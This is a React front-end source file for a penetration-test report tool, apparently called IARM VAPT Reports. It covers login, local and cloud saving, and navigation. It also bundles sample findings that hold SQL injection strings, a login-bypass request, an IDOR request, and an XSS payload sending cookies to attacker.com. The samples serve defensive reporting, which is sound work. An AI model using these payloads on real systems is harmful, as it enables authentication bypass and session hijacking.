import { useState, useEffect, useCallback } from 'react'
import Navbar from './components/Navbar'
import Home   from './pages/Home'
import HomeHub from './pages/HomeHub'
import LoginPage from './components/LoginPage'
import ImportPage from './components/ImportPage'
import ThemeToggle from './components/ThemeToggle'
import { useTheme } from './hooks/useTheme'
import { TOKEN_KEY, getMe, saveReportToDB } from './services/api'

const today = () => new Date().toISOString().split('T')[0]

const DEFAULT_META = {
  client_name: '',
  application_name: '',
  application_version: '',
  application_approach: 'Gray Box',
  application_url: [],
  tester_name: '',
  validator_name: '',
  project_id: '',
  assessment_startdate: '',
  assessment_enddate: '',
  report_delivery_date: '',
  basic_document_date: '',
  draft_document_date: '',
  peer_review_date: '',
  reassessment: '30 days',
  outofscope: [],
}

const SAMPLE_FINDINGS = [
  {
    id: 's001', title: 'SQL Injection — Login Form',
    summary: 'Authentication bypass via unsanitized username parameter',
    description: 'The `/api/auth/login` endpoint concatenates user-supplied input directly into the SQL query without parameterization.\n\n```sql\nSELECT * FROM users WHERE username=\'{input}\' AND password=\'{input}\'\n```\n\nThis allows an attacker to inject SQL syntax and bypass authentication entirely.',
    impact: 'Complete database compromise, authentication bypass without valid credentials, and potential Remote Code Execution via database-specific features (e.g., `xp_cmdshell`, `INTO OUTFILE`).',
    recommendation: 'Use parameterized queries or prepared statements for **all** database interactions. Never concatenate user input into SQL strings.\n\n```python\ncursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))\n```',
    cvss: { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', level: 'critical' },
    ease: 'Trivial', cwe: 'CWE-89',
    affected_components: ['/api/auth/login', '/api/admin/login'],
    payload: ["' OR 1=1--", "admin'--", "1' UNION SELECT NULL,NULL,NULL--"],
    poc: "POST /api/auth/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"' OR 1=1--\", \"password\": \"test\"}\n\nHTTP/1.1 200 OK — authentication bypassed",
    references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cwe.mitre.org/data/definitions/89.html'],
    validated: true, false_positive: false, source: 'manual',
  },
  {
    id: 's002', title: 'Stored XSS — User Profile Display Name',
    summary: 'Stored script executes on profile view for all users',
    description: 'The user profile display name field accepts HTML without server-side sanitization. The input is persisted to the database and rendered directly in the DOM when other users view the profile.',
    impact: 'Session hijacking of all users who view the profile, credential theft via keyloggers, stored malware distribution, and account takeover at scale.',
    recommendation: 'Sanitize all user input before storage using a server-side HTML sanitizer. Apply context-aware output encoding on display. Implement a strict `Content-Security-Policy` header.',
    cvss: { score: 8.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', level: 'high' },
    ease: 'Trivial', cwe: 'CWE-79',
    affected_components: ['/api/profile/update', '/profile/{username}'],
    payload: ['<script>fetch("https://attacker.com?c="+document.cookie)</script>', '<img src=x onerror=alert(document.domain)>'],
    poc: '1. Login as attacker → navigate to /profile/settings\n2. Set display name to <script>alert(document.cookie)</script>\n3. Login as victim → view attacker profile\n4. Script executes in victim\'s browser context',
    references: ['https://portswigger.net/web-security/cross-site-scripting/stored'],
    validated: true, false_positive: false, source: 'manual',
  },
  {
    id: 's003', title: 'IDOR — Unauthorized User Data Access',
    summary: 'Missing ownership validation on user profile API',
    description: 'The `/api/users/{id}/profile` endpoint returns sensitive user data without verifying that the authenticated user owns or has permission to access the requested resource.',
    impact: 'Full PII exposure including names, emails, phone numbers, and addresses for all registered users. Regulatory violations (GDPR, PDPA).',
    recommendation: 'Implement server-side ownership validation. Use UUID-based IDs to reduce guessability. Apply the principle of least privilege to all API endpoints.',
    cvss: { score: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', level: 'high' },
    ease: 'Moderate', cwe: 'CWE-639',
    affected_components: ['/api/users/{id}/profile', '/api/orders/{id}'],
    payload: ['GET /api/users/1001/profile (as user 2000)'],
    poc: 'Authenticated as user_id=2000:\nGET /api/users/1001/profile\nAuthorization: Bearer <valid_token>\n\nHTTP/1.1 200 OK — victim PII returned',
    references: ['https://portswigger.net/web-security/access-control/idor'],
    validated: false, false_positive: false, source: 'manual',
  },
  {
    id: 's004', title: 'Missing Security Headers',
    summary: 'HTTP responses missing recommended security controls',
    description: 'The application is missing several industry-standard security headers that protect against common client-side attacks including XSS, clickjacking, and MIME-type sniffing.',
    impact: 'Increased attack surface for XSS, clickjacking, and information disclosure attacks.',
    recommendation: 'Configure the web server to emit:\n- `Content-Security-Policy: default-src \'self\'`\n- `X-Frame-Options: DENY`\n- `X-Content-Type-Options: nosniff`\n- `Referrer-Policy: strict-origin-when-cross-origin`',
    cvss: { score: 4.3, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N', level: 'medium' },
    ease: 'Trivial', cwe: 'CWE-693',
    affected_components: ['All application responses'],
    payload: [],
    poc: 'curl -I https://target.com\n# No CSP, X-Frame-Options, or X-Content-Type-Options headers in response',
    references: ['https://owasp.org/www-project-secure-headers/', 'https://securityheaders.com'],
    validated: true, false_positive: false, source: 'manual',
  },
]

// ─── localStorage helpers ────────────────────────────────────────────────────
const LS_FINDINGS = 'vapt_findings_v2'
const LS_META     = 'vapt_meta_v2'

function lsRead(key, fallback) {
  try {
    const raw = localStorage.getItem(key)
    return raw ? JSON.parse(raw) : fallback
  } catch {
    return fallback
  }
}

function lsWrite(key, value) {
  try { localStorage.setItem(key, JSON.stringify(value)) } catch { /* quota */ }
}

let _toastId = 0

export default function App() {
  // Initialize theme at root
  useTheme()

  const [findings, setFindings]     = useState(() => lsRead(LS_FINDINGS, []))
  const [page, setPage]             = useState(() => lsRead(LS_FINDINGS, []).length > 0 ? 'dashboard' : 'hub')
  const [meta, setMeta]             = useState(() => ({ ...DEFAULT_META, ...lsRead(LS_META, {}) }))
  const [editTarget, setEditTarget] = useState(null)
  const [toasts, setToasts]         = useState([])
  const [savedAt, setSavedAt]       = useState(null)
  const [currentReportId, setCurrentReportId] = useState(() => lsRead('vapt_current_report_id', null))
  const [currentReportStatus, setCurrentReportStatus] = useState(() => lsRead('vapt_current_report_status', 'draft'))
  const [savingCloud, setSavingCloud] = useState(false)

  // ── Auth state ──────────────────────────────────────────────────────────────────
  // null = checking, null username = not logged in, string = logged in
  const [authUser, setAuthUser]     = useState(null)
  const [authChecking, setAuthChecking] = useState(true)

  // Validate stored token on mount
  useEffect(() => {
    const token = localStorage.getItem(TOKEN_KEY)
    if (!token) { setAuthChecking(false); return }
    getMe()
      .then(data => setAuthUser(data))
      .catch(() => {
        localStorage.removeItem(TOKEN_KEY)
        setAuthUser(null)
      })
      .finally(() => setAuthChecking(false))
  }, [])

  // Listen for 401 from any API call (interceptor fires this event)
  useEffect(() => {
    const handler = () => {
      setAuthUser(null)
      toast('Session expired — please sign in again', 'warn')
    }
    window.addEventListener('vapt:unauthorized', handler)
    return () => window.removeEventListener('vapt:unauthorized', handler)
  }, [])

  // ── Auto-save on every change ──────────────────────────────────────────────
  useEffect(() => {
    lsWrite(LS_FINDINGS, findings)
    lsWrite(LS_META, meta)
    lsWrite('vapt_current_report_id', currentReportId)
    lsWrite('vapt_current_report_status', currentReportStatus)
    setSavedAt(new Date())
  }, [findings, meta, currentReportId, currentReportStatus])

  const toast = useCallback((msg, type = 'ok', undoAction = null) => {
    const id = ++_toastId
    setToasts(prev => [...prev, { id, msg, type, undoAction }])
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), undoAction ? 10000 : 3400)
  }, [])

  const loadSample = () => {
    setFindings(SAMPLE_FINDINGS)
    setMeta(prev => ({
      ...prev,
      client_name: 'ACME Corporation',
      application_name: 'Customer Portal',
      application_version: '2.1',
      tester_name: 'Your Name',
      validator_name: 'Vignesh',
      project_id: `IARM-${new Date().getFullYear()}-042`,
    }))
    toast('Sample data loaded ✓')
    setPage('dashboard')
  }

  const saveToCloud = async () => {
    if (!meta.client_name) {
      toast('Client Name is required to save', 'warn')
      return
    }
    setSavingCloud(true)
    try {
      const data = await saveReportToDB(currentReportId, meta, findings)
      setCurrentReportId(data.id)
      setCurrentReportStatus(data.status || 'draft')
      toast('Saved to Cloud Database ✓')
    } catch (err) {
      toast('Failed to save to cloud', 'error')
    } finally {
      setSavingCloud(false)
    }
  }

  const handleBack = async () => {
    // If there's no active report data, simply return to the hub without saving
    if (findings.length === 0 && !meta.client_name && !currentReportId) {
      setPage('hub')
      return
    }

    let clientName = meta.client_name
    if (!clientName) {
      clientName = window.prompt("Enter Project Heading (Client Name) to save the draft:")
      if (!clientName) {
        return // User cancelled the prompt, abort going back
      }
      setMeta(prev => ({ ...prev, client_name: clientName }))
    }
    
    setSavingCloud(true)
    try {
      const updatedMeta = { ...meta, client_name: clientName }
      const data = await saveReportToDB(currentReportId, updatedMeta, findings)
      
      // Clear session from local state so HomeHub doesn't show "Resume Session"
      localStorage.removeItem(LS_FINDINGS)
      localStorage.removeItem(LS_META)
      localStorage.removeItem('vapt_current_report_id')
      localStorage.removeItem('vapt_current_report_status')
      setFindings([])
      setMeta({ ...DEFAULT_META })
      setCurrentReportId(null)
      setCurrentReportStatus('draft')
      setSavedAt(null)
      
      toast('Session saved to Cloud ✓')
      setPage('hub')
    } catch (err) {
      toast('Failed to save to cloud before exiting', 'error')
    } finally {
      setSavingCloud(false)
    }
  }

  const loadCloudReport = (id, newMeta, newFindings, status) => {
    setCurrentReportId(id)
    setCurrentReportStatus(status || 'draft')
    setMeta(newMeta)
    setFindings(newFindings)
    toast('Report loaded from Cloud ✓')
    setPage('dashboard')
  }

  const clearSession = () => {
    if (!window.confirm('Clear all findings and sign out? This cannot be undone.')) return
    // Clear all report data
    localStorage.removeItem(LS_FINDINGS)
    localStorage.removeItem(LS_META)
    localStorage.removeItem('vapt_current_report_id')
    localStorage.removeItem('vapt_current_report_status')
    setFindings([])
    setMeta({ ...DEFAULT_META })
    setCurrentReportId(null)
    setCurrentReportStatus('draft')
    setSavedAt(null)
    // Also sign out → goes to Login page
    localStorage.removeItem(TOKEN_KEY)
    setAuthUser(null)
    setPage('hub')
    toast('Session cleared — sign in again', 'warn')
  }

  const logout = () => {
    localStorage.removeItem(TOKEN_KEY)
    setAuthUser(null)
    setPage('hub')
    toast('Signed out', 'ok')
  }

  const navigateTo = (p) => {
    if (p !== 'editor') setEditTarget(null)
    setPage(p)
  }

  const SEV_COUNTS = findings.reduce((acc, f) => {
    if (!f.false_positive) acc[f.cvss?.level] = (acc[f.cvss?.level] || 0) + 1
    return acc
  }, {})

  // ── Auth gate ──────────────────────────────────────────────────────────────────
  if (authChecking) {
    return (
      <div style={{
        height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center',
        background: 'var(--bg)', flexDirection: 'column', gap: 16,
      }}>
        <span className="spinner" style={{ width: 28, height: 28 }} />
        <span style={{ color: 'var(--dim)', fontSize: 12, fontFamily: "'PT Sans', sans-serif" }}>Verifying session...</span>
      </div>
    )
  }

  if (!authUser) {
    return (
      <>
        <LoginPage onLogin={setAuthUser} />
        {/* Toast container still needed for session-expired messages */}
        <div className="toast-container">
          {toasts.map(t => (
            <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>
          ))}
        </div>
      </>
    )
  }

  // ── Home Hub / Import gates ───────────────────────────
  if (page === 'hub') {
    return (
      <>
        <HomeHub
          authUser={authUser}
          onLogout={logout}
          setPage={setPage}
          findingsCount={findings.length}
          onSelectImport={(scanType) => {
            // We could set the scanType state for ImportPage here if needed
            setPage('import')
          }}
        />
        <div className="toast-container">
          {toasts.map(t => (
            <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>
          ))}
        </div>
      </>
    )
  }

  if (page === 'import') {
    return (
      <>
        <ImportPage
          authUser={authUser}
          toast={toast}
          onBack={() => setPage(findings.length > 0 ? 'dashboard' : 'hub')}
          onImportDone={(newFindings, mode, scanType, template) => {
            setFindings(mode === 'replace' ? newFindings : [...findings, ...newFindings])
            setMeta(prev => ({ ...prev, scanType: scanType || 'nessus' }))
            toast(`Loaded ${newFindings.length} findings ✓`, 'ok')
            setPage('dashboard')
          }}
        />
        <div className="toast-container">
          {toasts.map(t => (
            <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>
          ))}
        </div>
      </>
    )
  }

  // ── Main app ──────────────────────────────────────────────────────────────────
  return (
    <div className="app-shell">
      {/* ── Top Header ── */}
      <header className="app-header">
        <div className="header-logo">
          <span className="header-logo-icon">⬡</span>
          <span className="header-logo-text">
            <span style={{ color: 'var(--red)' }}>IARM</span> VAPT REPORTS
          </span>
          <span className="header-logo-version">
            v1.0
          </span>
        </div>

        <div className="header-breadcrumb">
          <span>Workspace</span>
          <span>/</span>
          <span style={{ color: 'var(--text)' }}>
            {page.charAt(0).toUpperCase() + page.slice(1)}
          </span>
        </div>

        <div className="header-controls">
          <ThemeToggle />
        </div>
      </header>

      {/* ── Action Bar ── */}
      <div className="action-bar">
        <div className="action-bar-left">
          <button
            className="header-btn"
            onClick={handleBack}
            title="Save draft and return to Home Hub"
          >← Back</button>
          
          <button
            className="header-btn"
            style={{ color: 'var(--cyan)', borderColor: 'var(--cyan-dim)' }}
            onClick={saveToCloud}
            disabled={savingCloud}
            title="Save report to Cloud Database"
          >
            {savingCloud ? <span className="spinner" style={{ width: 10, height: 10, borderTopColor: 'var(--cyan)' }} /> : '☁'} Save to Cloud
          </button>
          
          {savedAt && (
            <span className="header-save-status">
              <span className="header-save-dot" />
              Saved {savedAt.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
            </span>
          )}
        </div>

        <div className="action-bar-right">
          <div className="action-status-chip">
            Status: <span style={{ color: currentReportStatus === 'final' ? 'var(--green)' : 'var(--orange)' }}>{currentReportStatus || 'Draft'}</span>
          </div>
          
          <div style={{ display: 'flex', gap: 12, alignItems: 'center', borderLeft: '1px solid var(--border)', paddingLeft: 16 }}>
            <span className="header-stat">{findings.length} findings</span>
            {['critical', 'high'].map(s => SEV_COUNTS[s] > 0 && (
              <span key={s} className={`header-sev header-sev-${s}`}>
                {SEV_COUNTS[s]} {s.charAt(0).toUpperCase()}
              </span>
            ))}
          </div>

          <button
            className="header-btn header-btn-danger"
            style={{ marginLeft: 8 }}
            onClick={clearSession}
            title="Clear all session data"
          >✕ Clear Session</button>
        </div>
      </div>

      <div className="app-body">
        <Navbar
          activePage={page}
          setPage={navigateTo}
          findingCount={findings.length}
          meta={meta}
          authUser={authUser}
        />

        <main className="main-content">
          <div style={{ maxWidth: 1100 }}>
            <Home
              page={page}
              setPage={navigateTo}
              findings={findings}
              setFindings={setFindings}
              meta={meta}
              setMeta={setMeta}
              editTarget={editTarget}
              setEditTarget={setEditTarget}
              toast={toast}
              onLoadSample={loadSample}
              onClearSession={clearSession}
              authUser={authUser}
              onEditReport={loadCloudReport}
              currentReportId={currentReportId}
              currentReportStatus={currentReportStatus}
              setCurrentReportStatus={setCurrentReportStatus}
            />
          </div>
        </main>
      </div>

      {/* ── Toasts ── */}
      <div className="toast-container">
        {toasts.map(t => (
          <div key={t.id} className={`toast ${t.type}`} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 16 }}>
            <span>{t.msg}</span>
            {t.undoAction && (
              <button
                onClick={() => {
                  t.undoAction()
                  setToasts(prev => prev.filter(toast => toast.id !== t.id))
                }}
                style={{
                  background: 'var(--cyan)', color: '#000', border: 'none',
                  padding: '4px 10px', borderRadius: 4, cursor: 'pointer',
                  fontSize: 11, fontWeight: 700, textTransform: 'uppercase',
                  flexShrink: 0
                }}
              >
                Undo
              </button>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}
